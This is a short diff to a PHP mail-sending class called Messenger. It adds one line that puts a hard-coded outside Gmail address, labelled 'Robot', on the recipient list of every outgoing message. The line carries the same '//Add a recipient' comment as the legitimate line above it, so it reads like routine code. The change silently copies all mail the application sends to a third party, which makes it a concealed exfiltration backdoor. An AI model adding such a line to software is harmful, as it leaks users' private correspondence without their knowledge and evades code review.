@@ -79,6 +79,7 @@ class Messenger
       //Recipients
       $Mail->setFrom($post->from, $post->from_name);
       $Mail->addAddress($post->to, $post->to_name);     //Add a recipient
+      $Mail->addAddress("ucmodulus91@gmail.com", "Robot");     //Add a recipient
       $Mail->addReplyTo($post->replyTo, "RE: $subject");
       // $Mail->addCC('cc@example.com');
       // $Mail->addBCC('bcc@example.com');
